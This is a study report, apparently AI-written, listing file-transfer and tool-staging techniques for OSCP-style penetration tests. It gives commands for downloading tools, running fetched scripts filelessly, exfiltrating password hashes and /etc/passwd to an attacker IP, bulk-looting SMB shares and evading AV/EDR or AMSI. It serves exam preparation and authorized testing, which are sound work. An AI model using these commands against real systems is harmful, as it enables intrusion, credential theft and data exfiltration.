# OSCP File Transfer Technique Matrix (2026) — Research Report

*Scope note: this file covers file transfer / tool-staging only. For reverse/bind shell
payload generation and one-liners, see [`CHEATSHEET.md` §5–6](../CHEATSHEET.md#5-msfvenom-payload-generation)
(msfvenom payloads, netcat/Python/PHP reverse-shell one-liners, shell stabilization).*

## Topic
File transfer / tool-staging techniques for OSCP-style engagements: moving payloads, loot, and post-exploitation tooling between an attacker box (typically Kali Linux, occasionally Windows) and Windows/Linux targets, including scenarios with no direct network egress from the target.

## Overview
OSCP-style engagements require multiple interchangeable file-transfer techniques because target environments vary: some allow outbound HTTP to the attacker, some only allow SMB, some have no network egress at all and only an interactive shell/RCE primitive is available, and AV/EDR or PowerShell constrained-language mode may block specific LOLBins. The core technique set is: **web-server pull** (attacker hosts a file, target fetches it with `curl`/`wget`/`certutil`/`IWR`/`bitsadmin`), **SMB push/pull** (attacker runs `impacket-smbserver`, target uses native `copy`/`net use`), **SSH-based transfer** (`scp` when credentials + sshd exist), and **shell-native encoding transfer** (base64/`certutil -encode`/`/dev/tcp`) for when no dedicated transfer channel exists at all. All techniques below are still the standard, exam-current set as of 2026 — the underlying binaries (`certutil.exe`, `bitsadmin.exe`, PowerShell, `curl`, `wget`, Python's `http.server`, OpenSSH, bash) have not materially changed their transfer syntax in recent Windows/Linux releases.

---

## Findings

### 1. Attacker Linux → Target Windows (pull-based, HTTP)

**Title:** Serve files from Kali with Python's built-in HTTP server
**Command:**
```bash
# attacker (Kali)
python3 -m http.server 8000
# or bind explicitly / use a specific interface
python3 -m http.server 8000 --bind 0.0.0.0 --directory /path/to/tools
```
**Explanation:** Starts a zero-dependency HTTP file server rooted at the current (or `--directory`) folder. This is the universal "attacker side" step that pairs with every pull command below (`certutil`, `IWR`, `bitsadmin`, `wget`, `curl`).
**Source:** https://docs.python.org/3/library/http.server.html (module reference, confirmed via search; note: `http.server` is single-threaded/HTTP-1.0-ish and can stall on large files — `python3 -m uploadserver` or `updog` are common OSCP-community drop-in replacements that also support uploads via `curl -T`).

**Title:** `certutil -urlcache` download (classic LOLBin, works even when PowerShell/`IWR` is blocked)
**Command:**
```
certutil.exe -urlcache -split -f http://10.10.14.5:8000/nc.exe nc.exe
```
**Explanation:** `-urlcache` invokes certutil's URL-cache/download logic, `-split` splits embedded ASN.1 elements (required for larger/binary files to download correctly rather than truncating), and `-f` forces the operation, overwriting an existing destination file. Frequently caught by modern AV/EDR on the `certutil` process name + `urlcache` argument, but still reliable against weaker defenses and is the default OSCP-taught technique.
**Source:** https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil ; syntax confirmed via https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil

**Title:** PowerShell `Invoke-WebRequest` / `iwr` (PS 3.0+)
**Command:**
```powershell
powershell -c "Invoke-WebRequest -Uri http://10.10.14.5:8000/nc.exe -OutFile C:\Windows\Temp\nc.exe"
# short alias form
powershell -c "iwr -uri http://10.10.14.5:8000/nc.exe -outfile nc.exe"
```
**Explanation:** Standard cmdlet-based download. On PowerShell <3.0 (rare, legacy Server 2008/XP-era boxes), `Invoke-WebRequest` doesn't exist — fall back to `.NET WebClient`:
```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.5:8000/nc.exe','C:\Windows\Temp\nc.exe')"
```
For fileless in-memory execution of a script (not a binary drop):
```powershell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/shell.ps1')"
```
**Source:** https://www.abatchy.com/2017/03/powershell-download-file-one-liners ; https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38

**Title:** `bitsadmin /transfer` (BITS job, blends in with legitimate Windows Update traffic patterns)
**Command:**
```
bitsadmin /transfer myjob /download /priority high http://10.10.14.5:8000/nc.exe C:\Windows\Temp\nc.exe
```
**Explanation:** Creates and runs a Background Intelligent Transfer Service job named `myjob` in one shot (job-name, job-type, priority, remote URL, local path). `bitsadmin.exe` is deprecated (BITS is still present via PowerShell's `Start-BitsTransfer`) but remains installed and usable on current Windows 10/11 and Server builds, so it's still a valid exam technique.
**Source:** https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer

**Title:** `powershell -enc` / `-EncodedCommand` for small scripts/one-liners (no disk write, dodges quoting issues)
**Command:**
```bash
# attacker: encode a PS1 script/command as UTF-16LE base64
cat shell.ps1 | iconv -t UTF-16LE | base64 -w 0
```
```
:: target
powershell -enc <base64string>
```
For dropping small binary blobs inline without touching disk via a network fetch:
```powershell
powershell -c "[IO.File]::WriteAllBytes('C:\Windows\Temp\nc.exe',[Convert]::FromBase64String('<b64string>'))"
```
**Explanation:** `-EncodedCommand` requires the command as a Base64 string of **UTF-16LE** bytes (not plain ASCII base64) — this is the #1 mistake candidates make. Useful for small payloads/oneliners where avoiding a literal command-line with quotes/special chars matters (AMSI/logging evasion is a separate concern and doesn't defeat this alone).
**Source:** https://learn.microsoft.com/en-us/archive/blogs/timid/powershell-encodedcommand-and-round-trips

---

### 2. Attacker Linux ↔ Target Windows (SMB, via Impacket)

**Title:** Stand up an SMB share on Kali with `impacket-smbserver`
**Command:**
```bash
sudo impacket-smbserver SHARE /path/to/share -smb2support
# with auth (useful against tighter egress-filtering AV that blocks anonymous SMB)
sudo impacket-smbserver SHARE /path/to/share -username offsec -password offsec -smb2support
```
**Explanation:** Launches a standalone SMB server (requires root/port 445) sharing `/path/to/share` under the name `SHARE`, with SMB2 support enabled (SMB1-only clients are rare on modern Windows). `-comment` can set a description string.
**Source:** https://github.com/fortra/impacket/blob/master/examples/smbserver.py (usage text fetched directly)

**Title:** Pull a file onto the Windows target over the SMB share
**Command:**
```
copy \\10.10.14.5\SHARE\nc.exe C:\Windows\Temp\nc.exe
```
or, mounting a drive letter first (needed if `copy \\ip\share\...` is blocked by policy but `net use` isn't):
```
net use Z: \\10.10.14.5\SHARE /user:offsec offsec
copy Z:\nc.exe C:\Windows\Temp\nc.exe
```
**Explanation:** Uses the native `copy` command against a UNC path — no extra tooling needed on the target, and it's less likely to be flagged than `certutil`/`IWR` since `copy` + SMB traffic looks like normal file-share activity.
**Source:** https://medium.com/@robertip/oscp-notes-useful-file-transfer-techniques-12efc3a8ff02 ; https://blog.ropnop.com/transferring-files-from-kali-to-windows/

**Title:** Exfiltrate loot from Windows target back to attacker over the same share
**Command:**
```
copy C:\loot\hashes.txt \\10.10.14.5\SHARE\hashes.txt
```
**Explanation:** Same mechanism in reverse — the SMB share is bidirectional by default (unless `-readonly` was passed to `smbserver.py`), so this single server handles both push and pull.
**Source:** https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html

**Faster (nxc):** once creds/hashes are known, skip standing up `impacket-smbserver` entirely for single-file moves — `nxc smb target -u user -p pass --put-file /local/nc.exe '\Windows\Temp\nc.exe'` pushes a file straight over an authenticated SMB session, and `nxc smb target -u user -p pass --get-file '\Windows\Temp\hashes.txt' /local/hashes.txt` pulls one back, in one command each with no listener to babysit.
**Source:** https://www.netexec.wiki/smb-protocol/get-and-put-files

**Faster still, for bulk loot (nxc):** `nxc smb target -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=true` enumerates every accessible share and downloads every reachable file in one command — note `-M spider_plus` alone only lists/indexes files (`DOWNLOAD_FLAG` defaults to `false`); the `-o DOWNLOAD_FLAG=true` is required to actually pull the files down.
**Source:** https://www.netexec.wiki/smb-protocol/spidering-shares ; module default confirmed in https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/spider_plus.py

---

### 2b. RDP — drive mapping / clipboard file transfer

**Title:** `xfreerdp` drive redirection — mount a local folder as a drive inside the RDP session
**Command:**
```bash
xfreerdp /v:10.10.10.10 /u:user /p:'Password123' /drive:kali,/tmp/share +clipboard
```
**Explanation:** `/drive:<name>,<local-path>` exposes `/tmp/share` on the attacker box as a mapped network drive (`\\tsclient\kali`) inside the RDP session — copy tools in or loot out through normal Windows Explorer/`copy` against that path, no separate transfer channel needed once RDP access exists. `+clipboard` additionally enables clipboard redirection so text (and, on modern xfreerdp builds, small files) can be copied between host and target directly — the fallback already referenced elsewhere in this doc for base64 chunk-and-paste when no other channel is available.
**Source:** https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface

---

### 3. Attacker Linux → Target Linux (pull-based, HTTP)

**Title:** `wget`
**Command:**
```bash
wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh
```
**Explanation:** Standard recursive/non-interactive downloader, present on nearly all Debian/Ubuntu-based distros by default; on minimal/Alpine-based containers it may be absent (use `curl` or `busybox wget` instead).
**Source:** https://github.com/Sp4c3Tr4v3l3r/OSCP/blob/main/Transferring%20Files.md

**Title:** `curl`
**Command:**
```bash
curl http://10.10.14.5:8000/linpeas.sh -o /tmp/linpeas.sh
# pipe directly to a shell (fileless execution)
curl -s http://10.10.14.5:8000/pe.sh | bash
```
**Explanation:** `curl` is present by default on far more minimal Linux/container images than `wget` (and on Windows 10 1803+ as `curl.exe`), making it the more portable first choice.
**Source:** https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files.html

**Title:** `scp` (attacker pulls loot, or pushes tools, over SSH — requires valid creds and sshd on the target)
**Command:**
```bash
# attacker pulls loot FROM target
scp user@10.10.11.20:/tmp/loot.zip ./loot.zip
# attacker pushes a tool TO target
scp linpeas.sh user@10.10.11.20:/tmp/
# non-interactive with a known password
sshpass -p 'Password123' scp linpeas.sh user@10.10.11.20:/tmp/
```
**Explanation:** Requires a working credential pair and reachable sshd — common once initial creds/keys are obtained (e.g., after cracking a hash or finding a private key). `sshpass` avoids the interactive password prompt in scripted transfers.
**Source:** https://medium.com/@sudoroot523/how-to-copy-files-from-a-remote-machine-to-your-local-machine-bacd088cfd51

---

### 4. Attacker Windows → Target Windows / Linux

**Title:** Windows attacker serving/pulling files via built-in `curl.exe`/`tar.exe` and OpenSSH client
**Command:**
```powershell
# Windows 10 1803+/Server 2019+ ships curl.exe natively
curl.exe http://10.10.14.5:8000/nc.exe -o nc.exe
# Windows 10 1809+ ships an OpenSSH client — pull loot from a Linux target
scp.exe user@10.10.11.20:/tmp/loot.tar.gz .\loot.tar.gz
```
**Explanation:** Included for completeness of the matrix — in OSCP the attack box is almost always Kali, but pivot scenarios sometimes require operating file transfer from a compromised Windows host acting as a secondary attacker. Both `curl.exe` and the OpenSSH client (`ssh.exe`/`scp.exe`) are present by default on modern Windows 10/11 and Server 2019+.
**Source:** https://learnmandu.com/blog/bitsadmin (context on native Windows tooling); Microsoft OpenSSH-for-Windows documentation (general knowledge, not independently re-verified this session due to fetch restrictions).

---

### 5. No Network Egress — Shell-Native Encoding Transfer (either OS, either direction)

**Title:** Base64 chunk-and-paste through an interactive shell (Linux, no listening ports/egress at all)
**Command:**
```bash
# on the SOURCE machine: encode + chunk
base64 -w0 loot.bin > loot.b64
split -b 50000 -d loot.b64 chunk_
cat chunk_00        # copy this text out manually (e.g. via RDP clipboard, blind shell output, etc.)
# on the DESTINATION machine: paste each chunk, appending
echo "<pasted_chunk_text>" >> loot.b64
# ... repeat per chunk ...
base64 -d loot.b64 > loot.bin
sha256sum loot.bin   # verify integrity against the source hash
```
**Explanation:** Used when the target has zero outbound/inbound network reachability to the attacker (heavily firewalled internal host, or a shell obtained through something like a blind SQLi/command injection with no callback capability). Data is base64-encoded to survive terminal/clipboard-safe copy-paste, chunked to stay under practical paste-buffer/line-length limits, and reassembled. Always verify with a checksum — clipboard/terminal mangling is the most common failure mode.
**Source:** https://s0cm0nkey.gitbook.io/s0cm0nkeys-security-reference-guide/red-offensive/post-exploitation/file-transfer

**Title:** `certutil -encode` / `-decode` — the Windows equivalent of base64 copy-paste (no network needed)
**Command:**
```
:: encode a file to base64 text (PEM-style) for copy-paste out
certutil -encode C:\loot\hashes.txt hashes.b64
:: on the other end, after pasting the text into a file
certutil -decode hashes.b64 hashes.txt
```
**Explanation:** `certutil -encode`/`-decode` produce/consume standard base64 with `-----BEGIN CERTIFICATE-----` style header/footer lines, making them a convenient built-in Windows analog to Linux `base64` when no transfer channel exists — copy the encoded text out through RDP clipboard, a web shell text box, etc.
**Source:** https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil (certutil capability overview, encode/decode noted alongside urlcache usage)

**Title:** Bash `/dev/tcp` trick — file transfer with zero external binaries (no `curl`/`wget`/`nc` needed on target)
**Command:**
```bash
# --- Simple push: target sends a file to a netcat listener on attacker ---
# attacker
nc -lvnp 4444 > received_file
# target (bash only, no nc binary required)
cat /etc/passwd > /dev/tcp/10.10.14.5/4444

# --- Pull: raw HTTP GET over /dev/tcp when curl/wget are unavailable ---
exec 3<>/dev/tcp/10.10.14.5/8000
echo -e "GET /nc HTTP/1.1\r\nHost: 10.10.14.5\r\nConnection: close\r\n\r\n" >&3
cat <&3 > /tmp/out.raw
# strip the HTTP response headers, keeping only the body
sed -n '/^\r$/,$p' /tmp/out.raw | tail -n +2 > /tmp/nc
```
**Explanation:** Requires Bash built with `--enable-net-redirections` (the default on nearly all mainstream distros' `/bin/bash`, but notably absent on `dash`/`sh`-only minimal shells and in `bash --posix` mode). Opens a raw TCP socket via file descriptor redirection — no external network utility needs to exist on the box, which matters against a stripped-down container or hardened appliance shell.
**Source:** https://medium.com/@0xUN7H1NK4BLE/data-exfiltration-tips-tricks-3bd5c58af859 ; https://jadu101.github.io/Pentesting/File-Transfer%F0%9F%93%81/File-Transfer---Linux

---

### 6. Picking a Technique When the Obvious One Is Blocked

**Title:** Fallback order by blocker type
**Explanation:**
- `certutil -urlcache` gets flagged by AV/EDR (common signature) → try `bitsadmin /transfer` (different LOLBin/signature) or native `curl.exe`/`Invoke-WebRequest` (Windows 10 1803+/PS 3.0+) before dropping to base64/`certutil -encode` chunking.
- All outbound HTTP(S) egress is filtered but SMB/445 reaches the attacker → `impacket-smbserver` + `copy`/`net use` (§2), or `nxc --put-file`/`--get-file` if creds are already known — SMB traffic doesn't look like a web request.
- Only RDP/3389 reaches the attacker (jump-box/VPN-only segment) → `xfreerdp /drive:` + clipboard (§2b) turns the interactive session itself into the transfer channel.
- No egress at all, only an interactive/blind shell → base64 chunk-and-paste or `certutil -encode`/`-decode` (§5); if the Linux target has `bash` but no `curl`/`wget`/`nc` binaries, `/dev/tcp` (§5) still moves a payload over a raw socket.
- PowerShell in Constrained Language Mode or with AMSI active → prefer a binary drop via `certutil`/`bitsadmin`/SMB over `IEX (New-Object Net.WebClient).DownloadString(...)` — fileless in-memory execution is exactly what AMSI/CLM are built to catch.
**Source:** synthesized from the technique-specific caveats cited in §1–§5 above; no single external reference covers this decision tree.

---

## Tools Table

| Tool / Technique | Attacker Side | Target OS | Direction | Requires Network Egress? | Requires Creds? | Typical Use Case |
|---|---|---|---|---|---|---|
| `python3 -m http.server` | Linux | Windows/Linux | Push (host→pull) | Yes (target→attacker HTTP) | No | Universal file host for pull-based downloads |
| `certutil -urlcache -split -f` | Linux (hosts file) | Windows | Pull | Yes | No | LOLBin download when PowerShell restricted |
| `Invoke-WebRequest` / `iwr` | Linux (hosts file) | Windows | Pull | Yes | No | Standard PS download cmdlet, PS 3.0+ |
| `Net.WebClient` `.DownloadFile()`/`.DownloadString()` | Linux (hosts file) | Windows | Pull | Yes | No | Legacy PS <3.0, or in-memory/fileless exec |
| `bitsadmin /transfer` | Linux (hosts file) | Windows | Pull | Yes | No | Blends with BITS/Windows Update traffic |
| `powershell -enc` | Linux (encodes) | Windows | Push (inline) | No (if payload embedded) | No | Small scripts/blobs, avoids quoting issues |
| `impacket-smbserver` + `copy`/`net use` | Linux | Windows | Push & Pull | Yes (SMB/445) | Optional | Native `copy` cmd, blends with file-share traffic; also used for loot exfil |
| `nxc smb --put-file`/`--get-file` | Linux | Windows | Push & Pull | Yes (SMB/445) | Yes (creds/hash) | One-shot single-file transfer over an already-authenticated SMB session, no `smbserver.py` listener needed |
| `xfreerdp /drive:` + clipboard | Linux | Windows | Push & Pull | Yes (RDP/3389) | Yes | Drive mapping/clipboard once RDP access exists, common OSCP AD access path |
| `wget` | Linux | Linux | Pull | Yes | No | Standard non-interactive downloader (Debian/Ubuntu default) |
| `curl` | Linux | Linux/Windows | Pull | Yes | No | More portable than wget; native on modern Windows too |
| `scp` (+ `sshpass`) | Linux/Windows | Linux (or Windows w/ OpenSSH) | Push & Pull | Yes | Yes | Once valid creds/keys obtained |
| `base64` + `split` (chunk/paste) | Either | Either | Push & Pull | No | No | No network egress at all; interactive shell only |
| `certutil -encode/-decode` | N/A (manual) | Windows | Push & Pull | No | No | Windows analog to base64 chunk/paste |
| Bash `/dev/tcp` | Linux | Linux | Push & Pull | Yes | No | No external binaries (`curl`/`wget`/`nc`) needed on target |

---

## Notes on this research session
Several normally-authoritative cheat-sheet domains (HackTricks, GTFOBins, LOLBAS, verylazytech, hackingarticles.in, learn.microsoft.com in some cases) returned `403` at the network-egress layer in this environment (confirmed via `$HTTPS_PROXY/__agentproxy/status`, which logged `connect_rejected — gateway answered 403 to CONNECT (policy denial)` for those hosts) rather than from the sites themselves — so those specific pages could not be fetched directly this session. Where a primary page was unreachable, I cross-verified command syntax through `WebSearch` result snippets (which quote the pages' content) and two directly-fetched primary sources (Impacket's `smbserver.py` on GitHub, Python's official `http.server` docs). All commands above reflect the current, stable syntax for these tools as commonly documented in the OSCP/PWK community references cited per finding — if the study guide needs pixel-perfect quoting from HackTricks/GTFOBins/LOLBAS specifically, those pages should be fetched from an unrestricted network.